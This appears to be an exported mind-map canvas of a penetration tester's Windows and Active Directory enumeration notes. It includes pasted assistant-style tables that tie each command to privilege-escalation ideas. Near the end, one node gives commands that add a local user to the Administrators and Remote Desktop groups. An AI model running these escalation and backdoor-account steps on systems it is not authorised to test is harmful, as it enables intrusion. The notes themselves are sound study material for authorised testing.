{
	"nodes":[
		{"id":"02faa126b087790a","type":"group","x":-1760,"y":400,"width":1220,"height":880,"label":"Search topic"},
		{"id":"b766e572bc489ec9","type":"group","x":1600,"y":1760,"width":1136,"height":720,"label":"Untitled group"},
		{"id":"600906e6cbe095c9","type":"text","text":"## Scheduler Enumeration","x":224,"y":600,"width":336,"height":90},
		{"id":"be46450db2cae69a","type":"text","text":"# Mind map of Local enumeration","x":-1573,"y":-344,"width":392,"height":104,"color":"1"},
		{"id":"10a8688b038b625c","type":"text","text":"DSQUETY \n```\n6. **dsquery subnet -limit 0**: Lists all subnets in the domain.\n7. **dsquery site -limit 0**: Lists all sites in the domain.\n8. **dsquery contact -limit 0**: Lists all contacts in the domain.\n9. 1. **dsquery server -domain <domain>**: Lists servers in a domain.\n```","x":-2820,"y":400,"width":786,"height":309},
		{"id":"2de2ee2abb20ef8c","type":"text","text":"``` Powershell\n## Retrieves replication partner metadata for a specific domain controller.\nGet-ADReplicationPartnerMetadata -Target \"<DomainController>\"\n\n## Retrieves replication failures for a specific domain.\nGet-ADReplicationFailure -Scope \"<Domain>\"\n\n## Retrieves replication up-to-dateness vector table for a specific domain controller.\nGet-ADReplicationUpToDatenessVectorTable -Server \"<DomainController>\"\n\n## Retrieves fine-grained password policies in the domain.\nGet-ADFineGrainedPasswordPolicy\n```","x":-3840,"y":410,"width":834,"height":333},
		{"id":"0deb57519b817e85","type":"text","text":"## Running the Enumeration in Scripted Form","x":883,"y":1960,"width":357,"height":100},
		{"id":"f82fa6fce5beb074","type":"text","text":"## Check all services","x":883,"y":1261,"width":357,"height":80},
		{"id":"a05de09f9d7dad60","type":"text","text":"## Check scheduled tasks.","x":883,"y":607,"width":357,"height":69},
		{"id":"7d70237c675cebc5","type":"text","text":"# 1.AD RECON\n# 2.Ping Castle\n\n# 3.SharpHound","x":-840,"y":423,"width":260,"height":222,"color":"3"},
		{"id":"10e38a401095bdbb","type":"text","text":"## Service Enumeration","x":224,"y":1571,"width":336,"height":80},
		{"id":"34a71702744eb038","type":"text","text":"Got it! Here's a revised list that specifies whether each command should be run in Command Prompt (cmd) or PowerShell, and whether it requires administrative privileges or can be run as a normal user.\n\n### Windows Commands\n\n1. **Whoami**\n   - **Command**: `whoami`\n   - **Environment**: CMD / PowerShell\n   - **Privileges**: Normal User\n\n2. **Echo %username%**\n   - **Command**: `echo %username%`\n   - **Environment**: CMD\n   - **Privileges**: Normal User\n\n3. **Userinfo**\n   - **Command**: `net user %username%`\n   - **Environment**: CMD / PowerShell\n   - **Privileges**: Normal User\n\n4. **Privileges**\n   - **Command**: `whoami /priv`\n   - **Environment**: CMD / PowerShell\n   - **Privileges**: Normal User\n\n5. **Groups**\n   - **Command**: `whoami /groups`\n   - **Environment**: CMD / PowerShell\n   - **Privileges**: Normal User\n\n6. **Local Group Membership**\n   - **Command**: `net localgroup`\n   - **Environment**: CMD / PowerShell\n   - **Privileges**: Normal User\n\n7. **Logged on Users**\n   - **Command**: `query user`\n   - **Environment**: CMD / PowerShell\n   - **Privileges**: Normal User\n\n8. **Environment Variables**\n   - **Command**: `set`\n   - **Environment**: CMD\n   - **Privileges**: Normal User\n\n   - **Command**: `Get-ChildItem Env:`\n   - **Environment**: PowerShell\n   - **Privileges**: Normal User\n\n9. **User SID**\n   - **Command**: `whoami /user`\n   - **Environment**: CMD / PowerShell\n   - **Privileges**: Normal User\n\n10. **Logon Events**\n    - **Command**: `wevtutil qe Security /q:\"*[System/EventID=4624]\" /f:text /rd:true /c:1`\n    - **Environment**: CMD / PowerShell\n    - **Privileges**: Admin\n\n11. **List All Users**\n    - **Command**: `net user`\n    - **Environment**: CMD / PowerShell\n    - **Privileges**: Normal User\n\n12. **Check Current User Token Privileges**\n    - **Command**: `whoami /all`\n    - **Environment**: CMD / PowerShell\n    - **Privileges**: Normal User\n\n### Additional Commands for Admin Users\n\n13. **List Local Administrators Group Members**\n    - **Command**: `net localgroup administrators`\n    - **Environment**: CMD / PowerShell\n    - **Privileges**: Admin\n\n14. **Detailed User Account Information**\n    - **Command**: `wmic useraccount where name='%username%' get /all`\n    - **Environment**: CMD / PowerShell\n    - **Privileges**: Admin\n\n15. **Audit Policies**\n    - **Command**: `auditpol /get /category:*`\n    - **Environment**: CMD / PowerShell\n    - **Privileges**: Admin\n\n### PowerShell Specific Commands\n\n16. **Get Current User Information**\n    - **Command**: `Get-WmiObject -Class Win32_ComputerSystem`\n    - **Environment**: PowerShell\n    - **Privileges**: Normal User\n\n17. **Get Process Owner**\n    - **Command**: `Get-Process | Select-Object -Property Id,ProcessName,@{Name=\"Owner\";Expression={(Get-WmiObject Win32_Process -Filter \"ProcessId=$($_.Id)\").GetOwner().User}}`\n    - **Environment**: PowerShell\n    - **Privileges**: Admin\n\n### Summary Table\n\n| Command                                   | CMD | PowerShell | Normal User | Admin |\n| ----------------------------------------- | --- | ---------- | ----------- | ----- |\n| whoami                                    | ✓   | ✓          | ✓           |       |\n| echo %username%                           | ✓   |            | ✓           |       |\n| net user %username%                       | ✓   | ✓          | ✓           |       |\n| whoami /priv                              | ✓   | ✓          | ✓           |       |\n| whoami /groups                            | ✓   | ✓          | ✓           |       |\n| net localgroup                            | ✓   | ✓          | ✓           |       |\n| query user                                | ✓   | ✓          | ✓           |       |\n| set                                       | ✓   |            | ✓           |       |\n| Get-ChildItem Env:                        |     | ✓          | ✓           |       |\n| whoami /user                              | ✓   | ✓          | ✓           |       |\n| wevtutil qe Security                      | ✓   | ✓          |             | ✓     |\n| net user                                  | ✓   | ✓          | ✓           |       |\n| whoami /all                               | ✓   | ✓          | ✓           |       |\n| net localgroup administrators             | ✓   | ✓          |             | ✓     |\n| wmic useraccount                          | ✓   | ✓          |             | ✓     |\n| auditpol /get /category:*                 | ✓   | ✓          |             | ✓     |\n| Get-WmiObject -Class Win32_ComputerSystem |     | ✓          | ✓           |       |\n| Get-Process (with owner info)             |     | ✓          |             | ✓     |\n\nThis comprehensive list should cover your needs for enumerating current user information on Windows machines, distinguishing between CMD and PowerShell, and noting the required privileges. If you need any further modifications or additional commands, let me know!","x":-3067,"y":2194,"width":1137,"height":692},
		{"id":"179094e6ba2d2b2c","type":"text","text":"## Check system on domain or workgroup\n\n``` powershell\n\n(Get-WmiObject Win32_ComputerSystem).PartOfDomain\n(Get-WmiObject Win32_ComputerSystem).Domain\n\n```\n\n``` CMD\nwmic computersystem get domain,partofdomain\n```","x":-1014,"y":-434,"width":522,"height":285},
		{"id":"ce9ccc7c0e51dd61","type":"text","text":"## Domain Trust","x":883,"y":240,"width":357,"height":78},
		{"id":"47278f5e45b06dbf","type":"text","text":"## AD  Domain and Forest enumeration","x":883,"y":-220,"width":357,"height":78},
		{"id":"5e48ae0e0f1ab924","type":"text","text":"## Enumeration Tools \n","x":-1200,"y":500,"width":313,"height":69,"color":"#cca000"},
		{"id":"29e3222117a8cea0","type":"text","text":"## Network Enumeration","x":-1720,"y":440,"width":480,"height":69},
		{"id":"b6ca74efaa020150","type":"text","text":"## Plain Text Enumeration","x":-1720,"y":535,"width":480,"height":72},
		{"id":"1c15ca85f1694b23","type":"text","text":"Certainly! Below is a detailed table that outlines the enumeration commands for Windows, specifying the environment (CMD or PowerShell), required privileges (Normal User or Admin), what to look for in the output, and potential exploitation opportunities:\n\n| Command                                                                  | CMD                                                                                                                                             | PowerShell | Privileges  | What to Look For                         | Potential Exploit                                                                                |                                                                            |\n| ------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------- | ---------- | ----------- | ---------------------------------------- | ------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------- |\n| `whoami`                                                                 | ✓                                                                                                                                               | ✓          | Normal User | Current username                         | Identify if user is an admin or part of privileged groups.                                       |                                                                            |\n| `echo %username%`                                                        | ✓                                                                                                                                               |            | Normal User | Current username                         | Similar to `whoami`.                                                                             |                                                                            |\n| `net user %username%`                                                    | ✓                                                                                                                                               | ✓          | Normal User | Detailed user information                | Look for \"Password never expires\" or weak password policies. Attempt password guessing.          |                                                                            |\n| `whoami /priv`                                                           | ✓                                                                                                                                               | ✓          | Normal User | List of privileges                       | Look for `SeDebugPrivilege`, `SeImpersonatePrivilege`, `SeBackupPrivilege`, etc.                 |                                                                            |\n| `whoami /groups`                                                         | ✓                                                                                                                                               | ✓          | Normal User | User's group memberships                 | Membership in groups like Administrators, Backup Operators, or Remote Desktop Users.             |                                                                            |\n| `net localgroup`                                                         | ✓                                                                                                                                               | ✓          | Normal User | List of local groups and members         | Identify misconfigured group memberships for potential exploitation.                             |                                                                            |\n| `query user`                                                             | ✓                                                                                                                                               | ✓          | Normal User | Logged on users                          | Identify sessions for hijacking or lateral movement.                                             |                                                                            |\n| `set`                                                                    | ✓                                                                                                                                               |            | Normal User | Environment variables                    | Sensitive info like paths, passwords, or tokens. Use exposed paths to find writable directories. |                                                                            |\n| `Get-ChildItem Env:`                                                     |                                                                                                                                                 | ✓          | Normal User | Environment variables                    | Same as above.                                                                                   |                                                                            |\n| `whoami /user`                                                           | ✓                                                                                                                                               | ✓          | Normal User | User's Security Identifier (SID)         | Use SID to look up user privileges in security policies.                                         |                                                                            |\n| `wevtutil qe Security /q:\"*[System/EventID=4624]\" /f:text /rd:true /c:1` | ✓                                                                                                                                               | ✓          | Admin       | Recent logon events                      | Identify successful logons and correlate with exploitable sessions.                              |                                                                            |\n| `net user`                                                               | ✓                                                                                                                                               | ✓          | Normal User | List of all user accounts                | Identify weak or default accounts. Attempt password spraying or brute force.                     |                                                                            |\n| `whoami /all`                                                            | ✓                                                                                                                                               | ✓          | Normal User | Detailed token privileges                | Similar to `whoami /priv`. Look for exploitable privileges.                                      |                                                                            |\n| `net localgroup administrators`                                          | ✓                                                                                                                                               | ✓          | Admin       | Members of the Administrators group      | Confirm if your account is listed or find ways to add it.                                        |                                                                            |\n| `wmic useraccount where name='%username%' get /all`                      | ✓                                                                                                                                               | ✓          | Admin       | Comprehensive user account details       | Use information for further targeting and exploitation.                                          |                                                                            |\n| `auditpol /get /category:*`                                              | ✓                                                                                                                                               | ✓          | Admin       | Current audit policies                   | Identify if auditing is lax or improperly configured, allowing stealthy exploitation.            |                                                                            |\n| `Get-WmiObject -Class Win32_ComputerSystem`                              |                                                                                                                                                 | ✓          | Normal User | Info about the logged-in user and system | Correlate with other findings for targeted attacks.                                              |                                                                            |\n| `Get-Process                                                             | Select-Object -Property Id,ProcessName,@{Name=\"Owner\";Expression={(Get-WmiObject Win32_Process -Filter \"ProcessId=$($_.Id)\").GetOwner().User}}` |            | ✓           | Admin                                    | Ownership of running processes                                                                   | Identify processes owned by privileged users to hijack or manipulate them. |\n\n### Summary\n\nThis table provides a comprehensive overview of useful enumeration commands, environments where they can be run (CMD or PowerShell), the required user privileges, and what to look for in the output. The final column links each command's output to potential privilege escalation opportunities, helping to identify misconfigurations, excessive privileges, and other security gaps that can be exploited. If you need any further details or additional scenarios, feel free to ask!","x":-5007,"y":899,"width":3077,"height":1161},
		{"id":"c5163b6b6363c2cc","type":"text","text":"## Domain","x":-220,"y":-340,"width":250,"height":60},
		{"id":"e6154d5f4d65e09d","type":"text","text":"## AD Enumeration","x":224,"y":-366,"width":336,"height":86},
		{"id":"0293d6c1b4598b68","type":"text","text":"## Workgroup","x":-220,"y":2460,"width":250,"height":60},
		{"id":"b0e7bb614b38b769","type":"text","text":"Understood. Here’s a more detailed approach that ties enumeration commands to potential privilege escalation opportunities, including what to look for in the output and how to leverage it.\n\n### Windows Commands for Enumeration and Privilege Escalation\n\n#### Whoami\n- **Command**: `whoami`\n- **Environment**: CMD / PowerShell\n- **Privileges**: Normal User\n- **What to Look For**: The current username. Identify if the user is an admin or belongs to privileged groups.\n- **Potential Exploit**: If the user is an admin, directly attempt administrative tasks. If not, look for misconfigurations.\n\n#### Echo %username%\n- **Command**: `echo %username%`\n- **Environment**: CMD\n- **Privileges**: Normal User\n- **What to Look For**: The current username. Similar to `whoami`.\n\n#### Userinfo\n- **Command**: `net user %username%`\n- **Environment**: CMD / PowerShell\n- **Privileges**: Normal User\n- **What to Look For**: Detailed user information, account settings, and group memberships.\n- **Potential Exploit**: Look for \"Password never expires\" or \"User may change password\". If password policies are weak, attempt password guessing.\n\n#### Privileges\n- **Command**: `whoami /priv`\n- **Environment**: CMD / PowerShell\n- **Privileges**: Normal User\n- **What to Look For**: List of privileges assigned to the current user.\n- **Potential Exploit**: Look for privileges like `SeDebugPrivilege`, `SeImpersonatePrivilege`, `SeBackupPrivilege`, etc. These can often be leveraged for privilege escalation (e.g., using tools like Juicy Potato).\n\n#### Groups\n- **Command**: `whoami /groups`\n- **Environment**: CMD / PowerShell\n- **Privileges**: Normal User\n- **What to Look For**: Groups the user is a member of.\n- **Potential Exploit**: Membership in privileged groups such as Administrators, Backup Operators, or Remote Desktop Users can provide vectors for escalation.\n\n#### Local Group Membership\n- **Command**: `net localgroup`\n- **Environment**: CMD / PowerShell\n- **Privileges**: Normal User\n- **What to Look For**: List of all local groups and their members.\n- **Potential Exploit**: Identify any misconfigured group memberships that can be exploited (e.g., if a non-admin user is part of the Administrators group).\n\n#### Logged on Users\n- **Command**: `query user`\n- **Environment**: CMD / PowerShell\n- **Privileges**: Normal User\n- **What to Look For**: Users currently logged on.\n- **Potential Exploit**: Identify sessions that might be hijacked or used for lateral movement.\n\n#### Environment Variables\n- **Command (CMD)**: `set`\n- **Command (PowerShell)**: `Get-ChildItem Env:`\n- **Privileges**: Normal User\n- **What to Look For**: Sensitive information stored in environment variables, such as paths, passwords, or tokens.\n- **Potential Exploit**: Use exposed paths to find writable directories or binaries. Use credentials/tokens for further exploitation.\n\n#### User SID\n- **Command**: `whoami /user`\n- **Environment**: CMD / PowerShell\n- **Privileges**: Normal User\n- **What to Look For**: User's Security Identifier (SID).\n- **Potential Exploit**: Use SID to look up user privileges in security policies.\n\n#### Logon Events\n- **Command**: `wevtutil qe Security /q:\"*[System/EventID=4624]\" /f:text /rd:true /c:1`\n- **Environment**: CMD / PowerShell\n- **Privileges**: Admin\n- **What to Look For**: Recent logon events.\n- **Potential Exploit**: Identify successful logons and correlate with potentially exploitable sessions.\n\n#### List All Users\n- **Command**: `net user`\n- **Environment**: CMD / PowerShell\n- **Privileges**: Normal User\n- **What to Look For**: List of all user accounts.\n- **Potential Exploit**: Identify weak or default accounts. Attempt password spraying or brute force.\n\n#### Check Current User Token Privileges\n- **Command**: `whoami /all`\n- **Environment**: CMD / PowerShell\n- **Privileges**: Normal User\n- **What to Look For**: Detailed token privileges.\n- **Potential Exploit**: Similar to `whoami /priv`. Look for exploitable privileges.\n\n### Additional Commands for Admin Users\n\n#### List Local Administrators Group Members\n- **Command**: `net localgroup administrators`\n- **Environment**: CMD / PowerShell\n- **Privileges**: Admin\n- **What to Look For**: Members of the Administrators group.\n- **Potential Exploit**: Confirm if your account is listed or find ways to add it.\n\n#### Detailed User Account Information\n- **Command**: `wmic useraccount where name='%username%' get /all`\n- **Environment**: CMD / PowerShell\n- **Privileges**: Admin\n- **What to Look For**: Comprehensive user account details.\n- **Potential Exploit**: Use information for further targeting and exploitation.\n\n#### Audit Policies\n- **Command**: `auditpol /get /category:*`\n- **Environment**: CMD / PowerShell\n- **Privileges**: Admin\n- **What to Look For**: Current audit policies.\n- **Potential Exploit**: Identify if auditing is lax or improperly configured, which might allow stealthy exploitation.\n\n### PowerShell Specific Commands\n\n#### Get Current User Information\n- **Command**: `Get-WmiObject -Class Win32_ComputerSystem`\n- **Environment**: PowerShell\n- **Privileges**: Normal User\n- **What to Look For**: Information about the logged-in user and system.\n- **Potential Exploit**: Correlate with other findings for targeted attacks.\n\n#### Get Process Owner\n- **Command**: `Get-Process | Select-Object -Property Id,ProcessName,@{Name=\"Owner\";Expression={(Get-WmiObject Win32_Process -Filter \"ProcessId=$($_.Id)\").GetOwner().User}}`\n- **Environment**: PowerShell\n- **Privileges**: Admin\n- **What to Look For**: Ownership of running processes.\n- **Potential Exploit**: Identify processes owned by privileged users to hijack or manipulate them.\n\n### Summary\n\nThis structured approach helps to identify potential privilege escalation vectors based on the output of enumeration commands. The key is to analyze the results for misconfigurations, excessive privileges, and other security gaps that can be exploited to escalate privileges, whether locally, horizontally, or vertically. If you need further details or additional scenarios, feel free to ask!","x":-4968,"y":2194,"width":1545,"height":3190},
		{"id":"0fd625fb25bd7682","type":"text","text":" \n```CMD\n# Retrieves details about the CPU such as name, number of cores, logical processors, and clock speed\nwmic cpu get Name, NumberOfCores, NumberOfLogicalProcessors, MaxClockSpeed\n\n# Provides information about the memory modules installed, including capacity, speed, manufacturer, and part number\nwmic memorychip get BankLabel, Capacity, Speed, Manufacturer, PartNumber\n\n# Lists details of disk drives such as model, size, media type, and serial number\nwmic diskdrive get Model, Size, MediaType, SerialNumber\n```\n\n``` powershell\n# Gathers detailed information about the CPU using the CIM (Common Information Model)\nGet-CimInstance -ClassName Win32_Processor\n\n# Retrieves details about the physical memory modules installed in the system\nGet-CimInstance -ClassName Win32_PhysicalMemory\n\n# Provides comprehensive information about disk drives including model, size, and other properties\nGet-CimInstance -ClassName Win32_DiskDrive\n```\n","x":1580,"y":2560,"width":1260,"height":544},
		{"id":"608fdb9ce399c55d","type":"text","text":"## Hardware Enumeration","x":883,"y":2799,"width":357,"height":66},
		{"id":"95ca6015ba1034aa","type":"text","text":"``` CMD\nnltest /domain_trusts Displays domain trust relationships.\nnltest /dclist:< domain > Lists domain controllers for a specified domain.\n```","x":1580,"y":205,"width":700,"height":149},
		{"id":"71d7fa52d78485de","type":"text","text":"``` Powershell\n## Retrieves the properties of the Active Directory domain.\nGet-ADDomain\n\n## Retrieves the properties of the Active Directory forest.\nGet-ADForest\n\n## Retrieves the properties of domain controllers.\nGet-ADDomainController \n\n## Retrieves domain controllers along with their names, sites, and IPv4 addresses.\nGet-ADDomainController -Filter * | Select-Object Name, Site, IPv4Address\n```\n\n","x":1567,"y":-341,"width":1013,"height":320},
		{"id":"ff732b12b148d58e","type":"text","text":"## DSQUERY","x":1480,"y":-600,"width":289,"height":74},
		{"id":"122733e5cf29c97d","type":"text","text":"```powershell\n$suspiciousKeywords = \"vuln\", \"suspicious\", \"malware\"\n$services = Get-Service | Where-Object {\n    $_.Name -match ($suspiciousKeywords -join \"|\")\n}\n\nforeach ($service in $services) {\n    Write-Output \"Service Name: $($service.Name)\"\n    Write-Output \"Service Display Name: $($service.DisplayName)\"\n    Write-Output \"Service Status: $($service.Status)\"\n    \n    $serviceDetails = Get-WmiObject -Class Win32_Service -Filter \"Name='$($service.Name)'\" | Format-List *\n    Write-Output $serviceDetails\n    \n    $servicePath = $serviceDetails.PathName\n    Write-Output \"Service Path: $servicePath\"\n    \n    $acl = Get-Acl $servicePath | Format-List\n    Write-Output $acl\n}\n\n```","x":1620,"y":1939,"width":1096,"height":521},
		{"id":"e0129930dad8eeba","type":"text","text":"### $ServicePath ?","x":1620,"y":1780,"width":250,"height":60},
		{"id":"c814b6cece9faa34","type":"text","text":"```CMD\n# Lists all services, including running and stopped\nsc query state= all\n\n# Queries the status of a specific service \nsc query wuauserv\n\n# Displays the configuration of a specific service\nsc qc wuauserv\n```\n\n```powershell\n# Lists all services on the system\nGet-Service | Format-List *\n\n# Provides detailed information about a specific service\nGet-Service -Name < ServiceName > | Format-List *\n\n# Lists services along with their statuses\nGet-Service | Select-Object Name, Status\n\n# Filters and lists only the running services\nGet-Service | Where-Object { $_.Status -eq 'Running' }\n\n# Retrieves detailed configuration and status of a specific service using WMI\nGet-WmiObject -Class Win32_Service -Filter \"Name='wuauserv'\" | Format-List *\n```","x":1580,"y":991,"width":1280,"height":620},
		{"id":"a0b951863e97e01b","type":"text","text":"```CMD\n# Lists all scheduled tasks with detailed information\nschtasks /query /fo LIST /v\n\n# Lists detailed information about a specific task named \"TaskName\".\nschtasks /query /fo LIST /v /tn <TaskName>\n\n```\n\n```powershell\n# Retrieves all scheduled tasks and formats the output in a detailed list format.\nGet-ScheduledTask | Format-List *\n\n# Lists scheduled tasks along with their triggers\nGet-ScheduledTask | Select-Object TaskName, Triggers\n\n```","x":1580,"y":454,"width":831,"height":382},
		{"id":"ea7f2a13f546dc8d","type":"text","text":"``` CMD\n## Lists all components of each type object.\ndsquery < user | computer | group | ou > -name * -limit 0\n\n## Lists all objects in the domain with their distinguished names.\ndsquery * -filter (objectClass=*) -attr distinguishedName\n```","x":2140,"y":-657,"width":960,"height":189},
		{"id":"d01ff3ae477bd6d8","type":"text","text":"``` Powershell\n## Retrieves all user accounts along with their names, SAM account names, and descriptions.\nGet-ADUser -Filter * -Properties * | Select-Object Name, SamAccountName, Description\n\n## Retrieves all groups along with their names, categories, and descriptions.\nGet-ADGroup -Filter * -Properties * | Select-Object Name, GroupCategory, Description\n\n## Retrieves all computers along with their names, operating systems, and service packs.\nGet-ADComputer -Filter * -Properties * | Select-Object Name, OperatingSystem, OperatingSystemServicePack\n\n## Retrieves all organizational units along with their names and descriptions.\nGet-ADOrganizationalUnit -Filter * -Properties * | Select-Object Name, Description\n```","x":2140,"y":-1187,"width":960,"height":320},
		{"id":"a0b43af4b97d53e5","type":"text","text":"## AD Common-Name(CN) enumeration","x":900,"y":-1064,"width":340,"height":84},
		{"id":"91e94e49805a18e0","type":"text","text":"## Get-AD commands","x":1480,"y":-1064,"width":289,"height":74},
		{"id":"8b1a617012d650e7","type":"text","text":"```CMD\n# Lists all installed software products along with their version and installation date\nwmic product get Name, Version, InstallDate\n```\n```powershell\n# Retrieves details about installed software using WMI (Windows Management Instrumentation)\nGet-WmiObject -Class Win32_Product\n\n# Lists all packages installed on the system, including those installed via package managers\nGet-Package\n```","x":1580,"y":3220,"width":1260,"height":260},
		{"id":"176c9b654332b164","type":"text","text":"## Installed Software","x":883,"y":3320,"width":357,"height":60},
		{"id":"dfb727dcc6ed7eae","type":"text","text":"## Check suspicious named tasks","x":2640,"y":607,"width":264,"height":77},
		{"id":"703c7defdf6773d9","type":"text","text":"``` Powershell\n## Retrieves all objects class.\nGet-ADObject -LDAPFilter \"(objectClass= < computer | group | user | organizationalUnit >)\"\n\n\n\n\n```","x":2140,"y":-1616,"width":857,"height":327,"color":"1"},
		{"id":"069f95b3afe3e7f8","type":"text","text":"``` powershell\n## Identify accounts where Kerberos pre-authentication is disabled, as these may be susceptible to brute-force attacks.\nGet-ADUser -Filter * -Properties DoesNotRequirePreAuth | Where-Object {$_.DoesNotRequirePreAuth -eq $true}\n\n## Enumerate accounts with Kerberos constrained delegation rights\nGet-ADUser -Filter * -Properties msDS-AllowedToDelegateTo | Where-Object {$_.msDS-AllowedToDelegateTo -ne $null}\n\n## Analyze Kerberos ticket lifetimes to ensure they align with security policies and detect anomalies.\nGet-ADUser -Identity <Username> -Properties KerberosTicketFlags | Select-Object KerberosTicketFlags\n```","x":902,"y":-1391,"width":1156,"height":258},
		{"id":"3f3bc9f3ddbddb3d","type":"text","text":"```CMD\n# Lists all available event logs on the system.\nwevtutil el\n\n# Queries specific event logs to retrieve the latest entries\nwevtutil qe System /c:5 /f:text\n```\n```powershell\n# Lists all event logs present on the system\nGet-EventLog -List\n\n# Retrieves the latest entries from a specified event log\nGet-EventLog -LogName System -Newest 10\n\n# Lists all event logs using the newer event logging system\nGet-WinEvent -ListLog *\n\n# Retrieves a specified number of recent entries from a specific event log\nGet-WinEvent -LogName System -MaxEvents 10\n```","x":1580,"y":3580,"width":1260,"height":460},
		{"id":"91239944f8a7edd5","type":"text","text":"## Check permissions and ACL ","x":3120,"y":1265,"width":388,"height":73},
		{"id":"2c065c4f9b53fb4d","type":"text","text":"```CMD\nschtasks /query /tn <TaskName> /fo list /v\n```\n\n```Powershell\n$r = @(\"TaskName\",\"State\",\"Execute\");foreach ($t in Get-ScheduledTask){$a=\"\" | Select TaskName, State, Execute; $a.Taskname = $t.TaskName;$a.Execute = $t.Actions.Execute;$a.State=$t.State;$r += $a}$r | Where-Object TaskName -eq \"vulntask\"\n```\n","x":3120,"y":525,"width":784,"height":241},
		{"id":"66bb7c823362e9e8","type":"text","text":"## NTLM\\Kerberos Enumeration ","x":224,"y":-1530,"width":336,"height":77},
		{"id":"35c0d89f91ba38a3","type":"text","text":"``` powershell\n## to list all cached Kerberos tickets on a Windows\nKlist\n```","x":900,"y":-1530,"width":520,"height":115},
		{"id":"374c876881c8bb7c","type":"text","text":"## Ldap Enumeration","x":1480,"y":-1489,"width":289,"height":74},
		{"id":"ae863a09f9efa0b4","type":"text","text":"## Event Logs","x":883,"y":3770,"width":357,"height":80},
		{"id":"9ac754a60f9e613f","type":"text","text":"## Users and Groups","x":3464,"y":-1300,"width":265,"height":75},
		{"id":"70cb92a429e23f5a","type":"text","text":"``` powershell\n## setspn used in Windows environments to manage Service Principal Names (SPNs)\nsetspn [options] < service account >\n\n## SPN to the specified account.\nsetspn -A < SPN > < account >\n\n## Deletes an SPN from the specified account.\nsetspn -D < SPN > < account >\n\n## Lists all SPNs registered to the specified account.\nsetspn -L < account >\n\n\n```","x":900,"y":-2120,"width":800,"height":340},
		{"id":"f4ac75b58e011232","type":"text","text":"``` powershell\n## Monitor event logs for Kerberos TGS requests, which can provide insights into service principal names (SPNs) and authentication activities.\nGet-WinEvent -FilterHashtable @{LogName='Security'; ID=4769}\n```\n","x":900,"y":-1718,"width":1224,"height":131},
		{"id":"c226757e89689a23","type":"text","text":"##### Checks Access Control List (ACL) permissions of executable file of the service\n```CMD\nicacls C:\\Windows\\System32\\svchost.exe\n```\n\n```powershell\nget-acl C:\\Windows\\System32\\svchost.exe | fl\n```","x":3768,"y":1186,"width":796,"height":231},
		{"id":"e05e9a5b1a82d0d1","type":"text","text":"#### Check ACL of running task : \n##### Task To Run:                          C:\\\\path\\\\to\\\\task\n```CMD\nicacls C:\\path\\to\\task\n```\n\n``` Powershell\nget-acl c:\\tasks\\schtask.bat | fl\n```","x":4160,"y":114,"width":630,"height":224},
		{"id":"46c1560599835fe5","type":"text","text":"``` Powershell\n## Retrieves members of the domain group along with their names and SAM account names.\nGet-ADGroupMember \"< GroupName >\" | Select-Object Name, SamAccountName\n```\n\n``` CMD\n##  Displays group information on a domain.\nnet group\n\n## Lists members of the Domain Admins group.\nnet group \"< GroupName >\" /domain\n```\n##### Important Group names for search : \n* Domain Admins, Enterprise Admins\n* Domain Controllers\n* Schema Admins, Exchange\n* Organization Administrators\n* Administrators\n\n","x":4040,"y":-1530,"width":820,"height":535},
		{"id":"52e4812348bdb22c","type":"text","text":" \n```CMD\n# Lists all drivers installed on the system\ndriverquery\n\n# Provides detailed information about each driver, including module name, display name, driver type, and link date\ndriverquery /v\n```\n```powershell\n# Retrieves details about system drivers using WMI\nGet-WmiObject -Class Win32_SystemDriver | Format-List *\n```","x":1580,"y":4140,"width":1260,"height":326},
		{"id":"3bd934717d6cbe33","type":"text","text":"## System Enumeration","x":224,"y":4100,"width":336,"height":80},
		{"id":"71c0359516cb7711","type":"text","text":"#### Check running task path for unquoted tasks:\n```\nTask To Run:                  C:\\Path\\my task\\task.exe\n```\n#### Check ACL for sub folder :\n``` CMD\nicacls C:\\Path\n```\n\n``` Powershell\nget-acl c:\\Path | fl\n```","x":4182,"y":470,"width":586,"height":352},
		{"id":"2b689f4d5e70d54e","type":"text","text":"## System Drivers","x":883,"y":4263,"width":357,"height":80},
		{"id":"532de4a52720ec91","type":"text","text":"## Permissions:\n### `BUILTIN\\Users:(I)(F)` : use X\n\n### `BUILTIN\\Users:(I)(M)` : use X","x":4840,"y":124,"width":440,"height":204},
		{"id":"85f1b08da9f60486","type":"text","text":"## Firewall Configuration","x":883,"y":4680,"width":357,"height":60},
		{"id":"09ac2679e50f6d23","type":"text","text":" \n```CMD\n# Displays the current configuration of the Windows Firewall, including settings for all profiles (domain, private, and public)\nnetsh advfirewall show allprofiles\n```\n```powershell\n# Retrieves the list of firewall rules configured on the system\nGet-NetFirewallRule\n```","x":1580,"y":4580,"width":1260,"height":260},
		{"id":"f6808bf87ee97a1b","type":"text","text":"## Permissions:\n### `BUILTIN\\Users:(I)(F)` : use X\n\n### `BUILTIN\\Users:(I)(M)` : use X","x":4840,"y":516,"width":460,"height":260},
		{"id":"d590cb6ac5ed98f5","type":"text","text":"## Group Policy Information","x":883,"y":5016,"width":357,"height":66},
		{"id":"32a7a61fd959c561","type":"text","text":" \n```CMD\n# Displays the resultant set of policies for the current user\ngpresult /r\n# Generates an HTML report of the resultant set of policies for the system and user\ngpresult /h gpreport.html\n```","x":1580,"y":4940,"width":1260,"height":219},
		{"id":"5e3a6e70dc9bc222","type":"text","text":"``` Powershell \n#List sessions\nqwinsta\nklist sessions\n```","x":2840,"y":5337,"width":303,"height":114},
		{"id":"c92c43aa886618cd","type":"text","text":"``` powershell\n## Add local user and put them local Administrators group\nnet user username password /ADD\nnet localgroup Administrators username /ADD\n\n# Add user to insteresting groups\nnet localgroup \"< Remote Desktop Users | Power users | Debugger users >\" UserLoginName  /add\n```","x":3645,"y":5259,"width":860,"height":200},
		{"id":"3b898aa7f6fe1202","type":"text","text":"``` powershell\n## Provides detailed system information, including system boot time\nsysteminfo | find \"System Boot Time\"\n\n## Retrieves the last boot-up time of the operating system\n(Get-CimInstance -ClassName Win32_OperatingSystem).LastBootUpTime\n```","x":1580,"y":5260,"width":680,"height":180},
		{"id":"27058d0c157af620","type":"text","text":"## System Uptime","x":883,"y":5315,"width":357,"height":69},
